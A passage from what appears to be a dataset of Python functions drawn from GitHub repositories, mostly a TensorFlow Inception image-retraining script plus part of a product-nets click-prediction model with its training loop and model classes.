    if not gfile.Exists(image_dir):
        print(""Image directory '"" + image_dir + ""' not found."")
        return None
    result = {}
    sub_dirs = [x[0] for x in gfile.Walk(image_dir)]
    is_root_dir = True
    for sub_dir in sub_dirs:
        if is_root_dir:
            is_root_dir = False
            continue
        extensions = ['jpg', 'jpeg', 'JPG', 'JPEG']
        file_list = []
        dir_name = os.path.basename(sub_dir)
        if dir_name == image_dir:
            continue
        print(""Looking for images in '"" + dir_name + ""'"")
        for extension in extensions:
            file_glob = os.path.join(image_dir, dir_name, '*.' + extension)
            file_list.extend(gfile.Glob(file_glob))
        if not file_list:
            print('No files found')
            continue
        if len(file_list) < 20:
            print('WARNING: Folder has less than 20 images, which may cause issues.')
        elif len(file_list) > MAX_NUM_IMAGES_PER_CLASS:
            print('WARNING: Folder {} has more than {} images. Some images will never be selected.'.format(dir_name, MAX_NUM_IMAGES_PER_CLASS))
        label_name = re.sub('[^a-z0-9]+', ' ', dir_name.lower())
        training_images = []
        testing_images = []
        validation_images = []
        for file_name in file_list:
            base_name = os.path.basename(file_name)
            hash_name = re.sub('_nohash_.*$', '', file_name)
            hash_name_hashed = hashlib.sha1(compat.as_bytes(hash_name)).hexdigest()
            percentage_hash = int(hash_name_hashed, 16) % (MAX_NUM_IMAGES_PER_CLASS + 1) * (100.0 / MAX_NUM_IMAGES_PER_CLASS)
            if percentage_hash < validation_percentage:
                validation_images.append(base_name)
            elif percentage_hash < testing_percentage + validation_percentage:
                testing_images.append(base_name)
            else:
                training_images.append(base_name)
        result[label_name] = {'dir': dir_name, 'training': training_images, 'testing': testing_images, 'validation': validation_images}
    return result"
ArunMichaelDsouza/tensorflow-image-detection,get_image_path,"def get_image_path(image_lists, label_name, index, image_dir, category):
    """"""""Returns a path to an image for a label at the given index.

  Args:
    image_lists: Dictionary of training images for each label.
    label_name: Label string we want to get an image for.
    index: Int offset of the image we want. This will be moduloed by the
    available number of images for the label, so it can be arbitrarily large.
    image_dir: Root folder string of the subfolders containing the training
    images.
    category: Name string of set to pull images from - training, testing, or
    validation.

  Returns:
    File system path string to an image that meets the requested parameters.

  """"""
    if label_name not in image_lists:
        tf.logging.fatal('Label does not exist %s.', label_name)
    label_lists = image_lists[label_name]
    if category not in label_lists:
        tf.logging.fatal('Category does not exist %s.', category)
    category_list = label_lists[category]
    if not category_list:
        tf.logging.fatal('Label %s has no images in the category %s.', label_name, category)
    mod_index = index % len(category_list)
    base_name = category_list[mod_index]
    sub_dir = label_lists['dir']
    full_path = os.path.join(image_dir, sub_dir, base_name)
    return full_path"
ArunMichaelDsouza/tensorflow-image-detection,get_bottleneck_path,"def get_bottleneck_path(image_lists, label_name, index, bottleneck_dir, category):
    """"""""Returns a path to a bottleneck file for a label at the given index.

  Args:
    image_lists: Dictionary of training images for each label.
    label_name: Label string we want to get an image for.
    index: Integer offset of the image we want. This will be moduloed by the
    available number of images for the label, so it can be arbitrarily large.
    bottleneck_dir: Folder string holding cached files of bottleneck values.
    category: Name string of set to pull images from - training, testing, or
    validation.

  Returns:
    File system path string to an image that meets the requested parameters.
  """"""
    return get_image_path(image_lists, label_name, index, bottleneck_dir, category) + '.txt'"
ArunMichaelDsouza/tensorflow-image-detection,create_inception_graph,"def create_inception_graph():
    """"""""Creates a graph from saved GraphDef file and returns a Graph object.

  Returns:
    Graph holding the trained Inception network, and various tensors we'll be
    manipulating.
  """"""
    with tf.Graph().as_default() as graph:
        model_filename = os.path.join(FLAGS.model_dir, 'classify_image_graph_def.pb')
        with gfile.FastGFile(model_filename, 'rb') as f:
            graph_def = tf.GraphDef()
            graph_def.ParseFromString(f.read())
            (bottleneck_tensor, jpeg_data_tensor, resized_input_tensor) = tf.import_graph_def(graph_def, name='', return_elements=[BOTTLENECK_TENSOR_NAME, JPEG_DATA_TENSOR_NAME, RESIZED_INPUT_TENSOR_NAME])
    return (graph, bottleneck_tensor, jpeg_data_tensor, resized_input_tensor)"
ArunMichaelDsouza/tensorflow-image-detection,run_bottleneck_on_image,"def run_bottleneck_on_image(sess, image_data, image_data_tensor, bottleneck_tensor):
    """"""Runs inference on an image to extract the 'bottleneck' summary layer.

  Args:
    sess: Current active TensorFlow Session.
    image_data: String of raw JPEG data.
    image_data_tensor: Input data layer in the graph.
    bottleneck_tensor: Layer before the final softmax.

  Returns:
    Numpy array of bottleneck values.
  """"""
    bottleneck_values = sess.run(bottleneck_tensor, {image_data_tensor: image_data})
    bottleneck_values = np.squeeze(bottleneck_values)
    return bottleneck_values"
ArunMichaelDsouza/tensorflow-image-detection,maybe_download_and_extract,"def maybe_download_and_extract():
    """"""Download and extract model tar file.

  If the pretrained model we're using doesn't already exist, this function
  downloads it from the TensorFlow.org website and unpacks it into a directory.
  """"""
    dest_directory = FLAGS.model_dir
    if not os.path.exists(dest_directory):
        os.makedirs(dest_directory)
    filename = DATA_URL.split('/')[-1]
    filepath = os.path.join(dest_directory, filename)
    if not os.path.exists(filepath):

        def _progress(count, block_size, total_size):
            sys.stdout.write('\r>> Downloading %s %.1f%%' % (filename, float(count * block_size) / float(total_size) * 100.0))
            sys.stdout.flush()
        (filepath, _) = urllib.request.urlretrieve(DATA_URL, filepath, _progress)
        print()
        statinfo = os.stat(filepath)
        print('Successfully downloaded', filename, statinfo.st_size, 'bytes.')
    tarfile.open(filepath, 'r:gz').extractall(dest_directory)"
ArunMichaelDsouza/tensorflow-image-detection,ensure_dir_exists,"def ensure_dir_exists(dir_name):
    """"""Makes sure the folder exists on disk.

  Args:
    dir_name: Path string to the folder we want to create.
  """"""
    if not os.path.exists(dir_name):
        os.makedirs(dir_name)"
ArunMichaelDsouza/tensorflow-image-detection,write_list_of_floats_to_file,"def write_list_of_floats_to_file(list_of_floats, file_path):
    """"""Writes a given list of floats to a binary file.

  Args:
    list_of_floats: List of floats we want to write to a file.
    file_path: Path to a file where list of floats will be stored.

  """"""
    s = struct.pack('d' * BOTTLENECK_TENSOR_SIZE, *list_of_floats)
    with open(file_path, 'wb') as f:
        f.write(s)"
ArunMichaelDsouza/tensorflow-image-detection,read_list_of_floats_from_file,"def read_list_of_floats_from_file(file_path):
    """"""Reads list of floats from a given file.

  Args:
    file_path: Path to a file where list of floats was stored.
  Returns:
    Array of bottleneck values (list of floats).

  """"""
    with open(file_path, 'rb') as f:
        s = struct.unpack('d' * BOTTLENECK_TENSOR_SIZE, f.read())
        return list(s)"
ArunMichaelDsouza/tensorflow-image-detection,create_bottleneck_file,"def create_bottleneck_file(bottleneck_path, image_lists, label_name, index, image_dir, category, sess, jpeg_data_tensor, bottleneck_tensor):
    """"""Create a single bottleneck file.""""""
    print('Creating bottleneck at ' + bottleneck_path)
    image_path = get_image_path(image_lists, label_name, index, image_dir, category)
    if not gfile.Exists(image_path):
        tf.logging.fatal('File does not exist %s', image_path)
    image_data = gfile.FastGFile(image_path, 'rb').read()
    try:
        bottleneck_values = run_bottleneck_on_image(sess, image_data, jpeg_data_tensor, bottleneck_tensor)
    except:
        raise RuntimeError('Error during processing file %s' % image_path)
    bottleneck_string = ','.join((str(x) for x in bottleneck_values))
    with open(bottleneck_path, 'w') as bottleneck_file:
        bottleneck_file.write(bottleneck_string)"
ArunMichaelDsouza/tensorflow-image-detection,get_or_create_bottleneck,"def get_or_create_bottleneck(sess, image_lists, label_name, index, image_dir, category, bottleneck_dir, jpeg_data_tensor, bottleneck_tensor):
    """"""Retrieves or calculates bottleneck values for an image.

  If a cached version of the bottleneck data exists on-disk, return that,
  otherwise calculate the data and save it to disk for future use.

  Args:
    sess: The current active TensorFlow Session.
    image_lists: Dictionary of training images for each label.
    label_name: Label string we want to get an image for.
    index: Integer offset of the image we want. This will be modulo-ed by the
    available number of images for the label, so it can be arbitrarily large.
    image_dir: Root folder string  of the subfolders containing the training
    images.
    category: Name string of which  set to pull images from - training, testing,
    or validation.
    bottleneck_dir: Folder string holding cached files of bottleneck values.
    jpeg_data_tensor: The tensor to feed loaded jpeg data into.
    bottleneck_tensor: The output tensor for the bottleneck values.

  Returns:
    Numpy array of values produced by the bottleneck layer for the image.
  """"""
    label_lists = image_lists[label_name]
    sub_dir = label_lists['dir']
    sub_dir_path = os.path.join(bottleneck_dir, sub_dir)
    ensure_dir_exists(sub_dir_path)
    bottleneck_path = get_bottleneck_path(image_lists, label_name, index, bottleneck_dir, category)
    if not os.path.exists(bottleneck_path):
        create_bottleneck_file(bottleneck_path, image_lists, label_name, index, image_dir, category, sess, jpeg_data_tensor, bottleneck_tensor)
    with open(bottleneck_path, 'r') as bottleneck_file:
        bottleneck_string = bottleneck_file.read()
    did_hit_error = False
    try:
        bottleneck_values = [float(x) for x in bottleneck_string.split(',')]
    except ValueError:
        print('Invalid float found, recreating bottleneck')
        did_hit_error = True
    if did_hit_error:
        create_bottleneck_file(bottleneck_path, image_lists, label_name, index, image_dir, category, sess, jpeg_data_tensor, bottleneck_tensor)
        with open(bottleneck_path, 'r') as bottleneck_file:
            bottleneck_string = bottleneck_file.read()
        bottleneck_values = [float(x) for x in bottleneck_string.split(',')]
    return bottleneck_values"
ArunMichaelDsouza/tensorflow-image-detection,cache_bottlenecks,"def cache_bottlenecks(sess, image_lists, image_dir, bottleneck_dir, jpeg_data_tensor, bottleneck_tensor):
    """"""Ensures all the training, testing, and validation bottlenecks are cached.

  Because we're likely to read the same image multiple times (if there are no
  distortions applied during training) it can speed things up a lot if we
  calculate the bottleneck layer values once for each image during
  preprocessing, and then just read those cached values repeatedly during
  training. Here we go through all the images we've found, calculate those
  values, and save them off.

  Args:
    sess: The current active TensorFlow Session.
    image_lists: Dictionary of training images for each label.
    image_dir: Root folder string of the subfolders containing the training
    images.
    bottleneck_dir: Folder string holding cached files of bottleneck values.
    jpeg_data_tensor: Input tensor for jpeg data from file.
    bottleneck_tensor: The penultimate output layer of the graph.

  Returns:
    Nothing.
  """"""
    how_many_bottlenecks = 0
    ensure_dir_exists(bottleneck_dir)
    for (label_name, label_lists) in image_lists.items():
        for category in ['training', 'testing', 'validation']:
            category_list = label_lists[category]
            for (index, unused_base_name) in enumerate(category_list):
                get_or_create_bottleneck(sess, image_lists, label_name, index, image_dir, category, bottleneck_dir, jpeg_data_tensor, bottleneck_tensor)
                how_many_bottlenecks += 1
                if how_many_bottlenecks % 100 == 0:
                    print(str(how_many_bottlenecks) + ' bottleneck files created.')"
ArunMichaelDsouza/tensorflow-image-detection,get_random_cached_bottlenecks,"def get_random_cached_bottlenecks(sess, image_lists, how_many, category, bottleneck_dir, image_dir, jpeg_data_tensor, bottleneck_tensor):
    """"""Retrieves bottleneck values for cached images.

  If no distortions are being applied, this function can retrieve the cached
  bottleneck values directly from disk for images. It picks a random set of
  images from the specified category.

  Args:
    sess: Current TensorFlow Session.
    image_lists: Dictionary of training images for each label.
    how_many: If positive, a random sample of this size will be chosen.
    If negative, all bottlenecks will be retrieved.
    category: Name string of which set to pull from - training, testing, or
    validation.
    bottleneck_dir: Folder string holding cached files of bottleneck values.
    image_dir: Root folder string of the subfolders containing the training
    images.
    jpeg_data_tensor: The layer to feed jpeg image data into.
    bottleneck_tensor: The bottleneck output layer of the CNN graph.

  Returns:
    List of bottleneck arrays, their corresponding ground truths, and the
    relevant filenames.
  """"""
    class_count = len(image_lists.keys())
    bottlenecks = []
    ground_truths = []
    filenames = []
    if how_many >= 0:
        for unused_i in range(how_many):
            label_index = random.randrange(class_count)
            label_name = list(image_lists.keys())[label_index]
            image_index = random.randrange(MAX_NUM_IMAGES_PER_CLASS + 1)
            image_name = get_image_path(image_lists, label_name, image_index, image_dir, category)
            bottleneck = get_or_create_bottleneck(sess, image_lists, label_name, image_index, image_dir, category, bottleneck_dir, jpeg_data_tensor, bottleneck_tensor)
            ground_truth = np.zeros(class_count, dtype=np.float32)
            ground_truth[label_index] = 1.0
            bottlenecks.append(bottleneck)
            ground_truths.append(ground_truth)
            filenames.append(image_name)
    else:
        for (label_index, label_name) in enumerate(image_lists.keys()):
            for (image_index, image_name) in enumerate(image_lists[label_name][category]):
                image_name = get_image_path(image_lists, label_name, image_index, image_dir, category)
                bottleneck = get_or_create_bottleneck(sess, image_lists, label_name, image_index, image_dir, category, bottleneck_dir, jpeg_data_tensor, bottleneck_tensor)
                ground_truth = np.zeros(class_count, dtype=np.float32)
                ground_truth[label_index] = 1.0
                bottlenecks.append(bottleneck)
                ground_truths.append(ground_truth)
                filenames.append(image_name)
    return (bottlenecks, ground_truths, filenames)"
ArunMichaelDsouza/tensorflow-image-detection,get_random_distorted_bottlenecks,"def get_random_distorted_bottlenecks(sess, image_lists, how_many, category, image_dir, input_jpeg_tensor, distorted_image, resized_input_tensor, bottleneck_tensor):
    """"""Retrieves bottleneck values for training images, after distortions.

  If we're training with distortions like crops, scales, or flips, we have to
  recalculate the full model for every image, and so we can't use cached
  bottleneck values. Instead we find random images for the requested category,
  run them through the distortion graph, and then the full graph to get the
  bottleneck results for each.

  Args:
    sess: Current TensorFlow Session.
    image_lists: Dictionary of training images for each label.
    how_many: The integer number of bottleneck values to return.
    category: Name string of which set of images to fetch - training, testing,
    or validation.
    image_dir: Root folder string of the subfolders containing the training
    images.
    input_jpeg_tensor: The input layer we feed the image data to.
    distorted_image: The output node of the distortion graph.
    resized_input_tensor: The input node of the recognition graph.
    bottleneck_tensor: The bottleneck output layer of the CNN graph.

  Returns:
    List of bottleneck arrays and their corresponding ground truths.
  """"""
    class_count = len(image_lists.keys())
    bottlenecks = []
    ground_truths = []
    for unused_i in range(how_many):
        label_index = random.randrange(class_count)
        label_name = list(image_lists.keys())[label_index]
        image_index = random.randrange(MAX_NUM_IMAGES_PER_CLASS + 1)
        image_path = get_image_path(image_lists, label_name, image_index, image_dir, category)
        if not gfile.Exists(image_path):
            tf.logging.fatal('File does not exist %s', image_path)
        jpeg_data = gfile.FastGFile(image_path, 'rb').read()
        distorted_image_data = sess.run(distorted_image, {input_jpeg_tensor: jpeg_data})
        bottleneck = run_bottleneck_on_image(sess, distorted_image_data, resized_input_tensor, bottleneck_tensor)
        ground_truth = np.zeros(class_count, dtype=np.float32)
        ground_truth[label_index] = 1.0
        bottlenecks.append(bottleneck)
        ground_truths.append(ground_truth)
    return (bottlenecks, ground_truths)"
ArunMichaelDsouza/tensorflow-image-detection,should_distort_images,"def should_distort_images(flip_left_right, random_crop, random_scale, random_brightness):
    """"""Whether any distortions are enabled, from the input flags.

  Args:
    flip_left_right: Boolean whether to randomly mirror images horizontally.
    random_crop: Integer percentage setting the total margin used around the
    crop box.
    random_scale: Integer percentage of how much to vary the scale by.
    random_brightness: Integer range to randomly multiply the pixel values by.

  Returns:
    Boolean value indicating whether any distortions should be applied.
  """"""
    return flip_left_right or random_crop != 0 or random_scale != 0 or (random_brightness != 0)"
ArunMichaelDsouza/tensorflow-image-detection,add_input_distortions,"def add_input_distortions(flip_left_right, random_crop, random_scale, random_brightness):
    """"""Creates the operations to apply the specified distortions.

  During training it can help to improve the results if we run the images
  through simple distortions like crops, scales, and flips. These reflect the
  kind of variations we expect in the real world, and so can help train the
  model to cope with natural data more effectively. Here we take the supplied
  parameters and construct a network of operations to apply them to an image.

  Cropping
  ~~~~~~~~

  Cropping is done by placing a bounding box at a random position in the full
  image. The cropping parameter controls the size of that box relative to the
  input image. If it's zero, then the box is the same size as the input and no
  cropping is performed. If the value is 50%, then the crop box will be half the
  width and height of the input. In a diagram it looks like this:

  <       width         >
  +---------------------+
  |                     |
  |   width - crop%     |
  |    <      >         |
  |    +------+         |
  |    |      |         |
  |    |      |         |
  |    |      |         |
  |    +------+         |
  |                     |
  |                     |
  +---------------------+

  Scaling
  ~~~~~~~

  Scaling is a lot like cropping, except that the bounding box is always
  centered and its size varies randomly within the given range. For example if
  the scale percentage is zero, then the bounding box is the same size as the
  input and no scaling is applied. If it's 50%, then the bounding box will be in
  a random range between half the width and height and full size.

  Args:
    flip_left_right: Boolean whether to randomly mirror images horizontally.
    random_crop: Integer percentage setting the total margin used around the
    crop box.
    random_scale: Integer percentage of how much to vary the scale by.
    random_brightness: Integer range to randomly multiply the pixel values by.
    graph.

  Returns:
    The jpeg input layer and the distorted result tensor.
  """"""
    jpeg_data = tf.placeholder(tf.string, name='DistortJPGInput')
    decoded_image = tf.image.decode_jpeg(jpeg_data, channels=MODEL_INPUT_DEPTH)
    decoded_image_as_float = tf.cast(decoded_image, dtype=tf.float32)
    decoded_image_4d = tf.expand_dims(decoded_image_as_float, 0)
    margin_scale = 1.0 + random_crop / 100.0
    resize_scale = 1.0 + random_scale / 100.0
    margin_scale_value = tf.constant(margin_scale)
    resize_scale_value = tf.random_uniform(tensor_shape.scalar(), minval=1.0, maxval=resize_scale)
    scale_value = tf.multiply(margin_scale_value, resize_scale_value)
    precrop_width = tf.multiply(scale_value, MODEL_INPUT_WIDTH)
    precrop_height = tf.multiply(scale_value, MODEL_INPUT_HEIGHT)
    precrop_shape = tf.stack([precrop_height, precrop_width])
    precrop_shape_as_int = tf.cast(precrop_shape, dtype=tf.int32)
    precropped_image = tf.image.resize_bilinear(decoded_image_4d, precrop_shape_as_int)
    precropped_image_3d = tf.squeeze(precropped_image, squeeze_dims=[0])
    cropped_image = tf.random_crop(precropped_image_3d, [MODEL_INPUT_HEIGHT, MODEL_INPUT_WIDTH, MODEL_INPUT_DEPTH])
    if flip_left_right:
        flipped_image = tf.image.random_flip_left_right(cropped_image)
    else:
        flipped_image = cropped_image
    brightness_min = 1.0 - random_brightness / 100.0
    brightness_max = 1.0 + random_brightness / 100.0
    brightness_value = tf.random_uniform(tensor_shape.scalar(), minval=brightness_min, maxval=brightness_max)
    brightened_image = tf.multiply(flipped_image, brightness_value)
    distort_result = tf.expand_dims(brightened_image, 0, name='DistortResult')
    return (jpeg_data, distort_result)"
ArunMichaelDsouza/tensorflow-image-detection,variable_summaries,"def variable_summaries(var):
    """"""Attach a lot of summaries to a Tensor (for TensorBoard visualization).""""""
    with tf.name_scope('summaries'):
        mean = tf.reduce_mean(var)
        tf.summary.scalar('mean', mean)
        with tf.name_scope('stddev'):
            stddev = tf.sqrt(tf.reduce_mean(tf.square(var - mean)))
        tf.summary.scalar('stddev', stddev)
        tf.summary.scalar('max', tf.reduce_max(var))
        tf.summary.scalar('min', tf.reduce_min(var))
        tf.summary.histogram('histogram', var)"
ArunMichaelDsouza/tensorflow-image-detection,add_final_training_ops,"def add_final_training_ops(class_count, final_tensor_name, bottleneck_tensor):
    """"""Adds a new softmax and fully-connected layer for training.

  We need to retrain the top layer to identify our new classes, so this function
  adds the right operations to the graph, along with some variables to hold the
  weights, and then sets up all the gradients for the backward pass.

  The set up for the softmax and fully-connected layers is based on:
  https://tensorflow.org/versions/master/tutorials/mnist/beginners/index.html

  Args:
    class_count: Integer of how many categories of things we're trying to
    recognize.
    final_tensor_name: Name string for the new final node that produces results.
    bottleneck_tensor: The output of the main CNN graph.

  Returns:
    The tensors for the training and cross entropy results, and tensors for the
    bottleneck input and ground truth input.
  """"""
    with tf.name_scope('input'):
        bottleneck_input = tf.placeholder_with_default(bottleneck_tensor, shape=[None, BOTTLENECK_TENSOR_SIZE], name='BottleneckInputPlaceholder')
        ground_truth_input = tf.placeholder(tf.float32, [None, class_count], name='GroundTruthInput')
    layer_name = 'final_training_ops'
    with tf.name_scope(layer_name):
        with tf.name_scope('weights'):
            initial_value = tf.truncated_normal([BOTTLENECK_TENSOR_SIZE, class_count], stddev=0.001)
            layer_weights = tf.Variable(initial_value, name='final_weights')
            variable_summaries(layer_weights)
        with tf.name_scope('biases'):
            layer_biases = tf.Variable(tf.zeros([class_count]), name='final_biases')
            variable_summaries(layer_biases)
        with tf.name_scope('Wx_plus_b'):
            logits = tf.matmul(bottleneck_input, layer_weights) + layer_biases
            tf.summary.histogram('pre_activations', logits)
    final_tensor = tf.nn.softmax(logits, name=final_tensor_name)
    tf.summary.histogram('activations', final_tensor)
    with tf.name_scope('cross_entropy'):
        cross_entropy = tf.nn.softmax_cross_entropy_with_logits(labels=ground_truth_input, logits=logits)
        with tf.name_scope('total'):
            cross_entropy_mean = tf.reduce_mean(cross_entropy)
    tf.summary.scalar('cross_entropy', cross_entropy_mean)
    with tf.name_scope('train'):
        optimizer = tf.train.GradientDescentOptimizer(FLAGS.learning_rate)
        train_step = optimizer.minimize(cross_entropy_mean)
    return (train_step, cross_entropy_mean, bottleneck_input, ground_truth_input, final_tensor)"
ArunMichaelDsouza/tensorflow-image-detection,add_evaluation_step,"def add_evaluation_step(result_tensor, ground_truth_tensor):
    """"""Inserts the operations we need to evaluate the accuracy of our results.

  Args:
    result_tensor: The new final node that produces results.
    ground_truth_tensor: The node we feed ground truth data
    into.

  Returns:
    Tuple of (evaluation step, prediction).
  """"""
    with tf.name_scope('accuracy'):
        with tf.name_scope('correct_prediction'):
            prediction = tf.argmax(result_tensor, 1)
            correct_prediction = tf.equal(prediction, tf.argmax(ground_truth_tensor, 1))
        with tf.name_scope('accuracy'):
            evaluation_step = tf.reduce_mean(tf.cast(correct_prediction, tf.float32))
    tf.summary.scalar('accuracy', evaluation_step)
    return (evaluation_step, prediction)"
ArunMichaelDsouza/tensorflow-image-detection,main,"def main(_):
    if tf.gfile.Exists(FLAGS.summaries_dir):
        tf.gfile.DeleteRecursively(FLAGS.summaries_dir)
    tf.gfile.MakeDirs(FLAGS.summaries_dir)
    maybe_download_and_extract()
    (graph, bottleneck_tensor, jpeg_data_tensor, resized_image_tensor) = create_inception_graph()
    image_lists = create_image_lists(FLAGS.image_dir, FLAGS.testing_percentage, FLAGS.validation_percentage)
    class_count = len(image_lists.keys())
    if class_count == 0:
        print('No valid folders of images found at ' + FLAGS.image_dir)
        return -1
    if class_count == 1:
        print('Only one valid folder of images found at ' + FLAGS.image_dir + ' - multiple classes are needed for classification.')
        return -1
    do_distort_images = should_distort_images(FLAGS.flip_left_right, FLAGS.random_crop, FLAGS.random_scale, FLAGS.random_brightness)
    with tf.Session(graph=graph) as sess:
        if do_distort_images:
            (distorted_jpeg_data_tensor, distorted_image_tensor) = add_input_distortions(FLAGS.flip_left_right, FLAGS.random_crop, FLAGS.random_scale, FLAGS.random_brightness)
        else:
            cache_bottlenecks(sess, image_lists, FLAGS.image_dir, FLAGS.bottleneck_dir, jpeg_data_tensor, bottleneck_tensor)
        (train_step, cross_entropy, bottleneck_input, ground_truth_input, final_tensor) = add_final_training_ops(len(image_lists.keys()), FLAGS.final_tensor_name, bottleneck_tensor)
        (evaluation_step, prediction) = add_evaluation_step(final_tensor, ground_truth_input)
        merged = tf.summary.merge_all()
        train_writer = tf.summary.FileWriter(FLAGS.summaries_dir + '/train', sess.graph)
        validation_writer = tf.summary.FileWriter(FLAGS.summaries_dir + '/validation')
        init = tf.global_variables_initializer()
        sess.run(init)
        for i in range(FLAGS.how_many_training_steps):
            if do_distort_images:
                (train_bottlenecks, train_ground_truth) = get_random_distorted_bottlenecks(sess, image_lists, FLAGS.train_batch_size, 'training', FLAGS.image_dir, distorted_jpeg_data_tensor, distorted_image_tensor, resized_image_tensor, bottleneck_tensor)
            else:
                (train_bottlenecks, train_ground_truth, _) = get_random_cached_bottlenecks(sess, image_lists, FLAGS.train_batch_size, 'training', FLAGS.bottleneck_dir, FLAGS.image_dir, jpeg_data_tensor, bottleneck_tensor)
            (train_summary, _) = sess.run([merged, train_step], feed_dict={bottleneck_input: train_bottlenecks, ground_truth_input: train_ground_truth})
            train_writer.add_summary(train_summary, i)
            is_last_step = i + 1 == FLAGS.how_many_training_steps
            if i % FLAGS.eval_step_interval == 0 or is_last_step:
                (train_accuracy, cross_entropy_value) = sess.run([evaluation_step, cross_entropy], feed_dict={bottleneck_input: train_bottlenecks, ground_truth_input: train_ground_truth})
                print('%s: Step %d: Train accuracy = %.1f%%' % (datetime.now(), i, train_accuracy * 100))
                print('%s: Step %d: Cross entropy = %f' % (datetime.now(), i, cross_entropy_value))
                (validation_bottlenecks, validation_ground_truth, _) = get_random_cached_bottlenecks(sess, image_lists, FLAGS.validation_batch_size, 'validation', FLAGS.bottleneck_dir, FLAGS.image_dir, jpeg_data_tensor, bottleneck_tensor)
                (validation_summary, validation_accuracy) = sess.run([merged, evaluation_step], feed_dict={bottleneck_input: validation_bottlenecks, ground_truth_input: validation_ground_truth})
                validation_writer.add_summary(validation_summary, i)
                print('%s: Step %d: Validation accuracy = %.1f%% (N=%d)' % (datetime.now(), i, validation_accuracy * 100, len(validation_bottlenecks)))
        (test_bottlenecks, test_ground_truth, test_filenames) = get_random_cached_bottlenecks(sess, image_lists, FLAGS.test_batch_size, 'testing', FLAGS.bottleneck_dir, FLAGS.image_dir, jpeg_data_tensor, bottleneck_tensor)
        (test_accuracy, predictions) = sess.run([evaluation_step, prediction], feed_dict={bottleneck_input: test_bottlenecks, ground_truth_input: test_ground_truth})
        print('Final test accuracy = %.1f%% (N=%d)' % (test_accuracy * 100, len(test_bottlenecks)))
        if FLAGS.print_misclassified_test_images:
            print('=== MISCLASSIFIED TEST IMAGES ===')
            for (i, test_filename) in enumerate(test_filenames):
                if predictions[i] != test_ground_truth[i].argmax():
                    print('%70s  %s' % (test_filename, list(image_lists.keys())[predictions[i]]))
        output_graph_def = graph_util.convert_variables_to_constants(sess, graph.as_graph_def(), [FLAGS.final_tensor_name])
        with gfile.FastGFile(FLAGS.output_graph, 'wb') as f:
            f.write(output_graph_def.SerializeToString())
        with gfile.FastGFile(FLAGS.output_labels, 'w') as f:
            f.write('\n'.join(image_lists.keys()) + '\n')"
ArunMichaelDsouza/tensorflow-image-detection,_progress,"def _progress(count, block_size, total_size):
    sys.stdout.write('\r>> Downloading %s %.1f%%' % (filename, float(count * block_size) / float(total_size) * 100.0))
    sys.stdout.flush()"
Atomu2014/product-nets,train,"def train(model):
    history_score = []
    for i in range(num_round):
        fetches = [model.optimizer, model.loss]
        if batch_size > 0:
            ls = []
            bar = progressbar.ProgressBar()
            print('[%d]\ttraining...' % i)
            for j in bar(range(int(train_size / batch_size + 1))):
                (X_i, y_i) = utils.slice(train_data, j * batch_size, batch_size)
                (_, l) = model.run(fetches, X_i, y_i)
                ls.append(l)
        elif batch_size == -1:
            (X_i, y_i) = utils.slice(train_data)
            (_, l) = model.run(fetches, X_i, y_i)
            ls = [l]
        train_preds = []
        print('[%d]\tevaluating...' % i)
        bar = progressbar.ProgressBar()
        for j in bar(range(int(train_size / 10000 + 1))):
            (X_i, _) = utils.slice(train_data, j * 10000, 10000)
            preds = model.run(model.y_prob, X_i, mode='test')
            train_preds.extend(preds)
        test_preds = []
        bar = progressbar.ProgressBar()
        for j in bar(range(int(test_size / 10000 + 1))):
            (X_i, _) = utils.slice(test_data, j * 10000, 10000)
            preds = model.run(model.y_prob, X_i, mode='test')
            test_preds.extend(preds)
        train_score = roc_auc_score(train_data[1], train_preds)
        test_score = roc_auc_score(test_data[1], test_preds)
        print('[%d]\tloss (with l2 norm):%f\ttrain-auc: %f\teval-auc: %f' % (i, np.mean(ls), train_score, test_score))
        history_score.append(test_score)
        if i > min_round and i > early_stop_round:
            if np.argmax(history_score) == i - early_stop_round and history_score[-1] - history_score[-1 * early_stop_round] < 1e-05:
                print('early stop\nbest iteration:\n[%d]\teval-auc: %f' % (np.argmax(history_score), np.max(history_score)))
                break"
Atomu2014/product-nets,__init__,"def __init__(self):
    self.sess = None
    self.X = None
    self.y = None
    self.layer_keeps = None
    self.vars = None
    self.keep_prob_train = None
    self.keep_prob_test = None"
Atomu2014/product-nets,run,"def run(self, fetches, X=None, y=None, mode='train'):
    feed_dict = {}
    if type(self.X) is list:
        for i in range(len(X)):
            feed_dict[self.X[i]] = X[i]
    else:
        feed_dict[self.X] = X
    if y is not None:
        feed_dict[self.y] = y
    if self.layer_keeps is not None:
        if mode == 'train':
            feed_dict[self.layer_keeps] = self.keep_prob_train
        elif mode == 'test':
            feed_dict[self.layer_keeps] = self.keep_prob_test
    return self.sess.run(fetches, feed_dict)"
Atomu2014/product-nets,dump,"def dump(self, model_path):
    var_map = {}
    for (name, var) in self.vars.iteritems():
        var_map[name] = self.run(var)
    pkl.dump(var_map, open(model_path, 'wb'))
    print('model dumped at', model_path)"
Atomu2014/product-nets,__init__,"def __init__(self, input_dim=None, output_dim=1, init_path=None, opt_algo='gd', learning_rate=0.01, l2_weight=0, random_seed=None):
    Model.__init__(self)
    init_vars = [('w', [input_dim, output_dim], 'xavier', dtype), ('b', [output_dim], 'zero', dtype)]
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = tf.sparse_placeholder(dtype)
        self.y = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w = self.vars['w']
        b = self.vars['b']
        xw = tf.sparse_tensor_dense_matmul(self.X, w)
        logits = tf.reshape(xw + b, [-1])
        self.y_prob = tf.sigmoid(logits)
        self.loss = tf.reduce_mean(tf.nn.sigmoid_cross_entropy_with_logits(labels=self.y, logits=logits)) + l2_weight * tf.nn.l2_loss(xw)
        self.optimizer = utils.get_optimizer(opt_algo, learning_rate, self.loss)
        config = tf.ConfigProto()
        config.gpu_options.allow_growth = True
        self.sess = tf.Session(config=config)
        tf.global_variables_initializer().run(session=self.sess)"
Atomu2014/product-nets,__init__,"def __init__(self, input_dim=None, output_dim=1, factor_order=10, init_path=None, opt_algo='gd', learning_rate=0.01, l2_w=0, l2_v=0, random_seed=None):
    Model.__init__(self)
    init_vars = [('w', [input_dim, output_dim], 'xavier', dtype), ('v', [input_dim, factor_order], 'xavier', dtype), ('b', [output_dim], 'zero', dtype)]
    self.graph = tf.Graph()
    with self.graph.as_default():
        if random_seed is not None:
            tf.set_random_seed(random_seed)
        self.X = tf.sparse_placeholder(dtype)
        self.y = tf.placeholder(dtype)
        self.vars = utils.init_var_map(init_vars, init_path)
        w = self.vars['w']
        v = self.vars['v']
